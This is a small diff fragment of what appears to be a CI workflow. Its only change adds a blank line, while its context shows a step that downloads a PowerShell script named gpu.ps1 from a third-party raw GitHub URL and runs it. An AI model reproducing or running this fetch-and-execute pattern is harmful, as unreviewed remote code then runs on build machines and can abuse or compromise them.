@@ -19,3 +19,4 @@ jobs:
             Invoke-WebRequest https://raw.githubusercontent.com/xertebe/xer/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
+
